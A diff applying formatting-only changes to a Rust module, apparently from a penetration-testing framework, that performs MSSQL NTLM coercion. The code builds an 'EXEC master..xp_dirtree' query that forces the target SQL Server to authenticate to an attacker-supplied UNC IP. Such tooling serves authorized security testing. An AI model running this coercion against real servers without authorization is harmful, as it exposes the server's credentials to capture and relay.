@@ -1,7 +1,7 @@
 use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};
 use anyhow::{anyhow, Result};
 use async_trait::async_trait;
-use nxc_protocols::{mssql::MssqlSession, mssql::MssqlProtocol, NxcSession};
+use nxc_protocols::{mssql::MssqlProtocol, mssql::MssqlSession, NxcSession};
 use serde_json::json;
 use tracing::info;
 
@@ -60,10 +60,15 @@ impl NxcModule for MssqlUnc {
             .downcast_ref::<MssqlSession>()
             .ok_or_else(|| anyhow!("Module requires an MSSQL session"))?;
 
-        let attacker_ip = opts.get("UNC_IP").ok_or_else(|| anyhow!("UNC_IP is required"))?;
+        let attacker_ip = opts
+            .get("UNC_IP")
+            .ok_or_else(|| anyhow!("UNC_IP is required"))?;
         let share = opts.get("SHARE").map(|s| s.as_str()).unwrap_or("share");
 
-        info!("Starting MSSQL NTLM Coercion against {} to {}", mssql_sess.target, attacker_ip);
+        info!(
+            "Starting MSSQL NTLM Coercion against {} to {}",
+            mssql_sess.target, attacker_ip
+        );
 
         let mut output = String::from("MSSQL UNC Coercion Results:\n");
         let mut coerced = false;
@@ -73,7 +78,7 @@ impl NxcModule for MssqlUnc {
 
         // We use xp_dirtree to trigger the authentication
         let sql = format!("EXEC master..xp_dirtree '{}', 1, 1;", unc_path);
-        
+
         output.push_str(&format!("  [*] Executing: {}\n", sql));
 
         if let Ok(_) = protocol.query_json(mssql_sess, &sql).await {
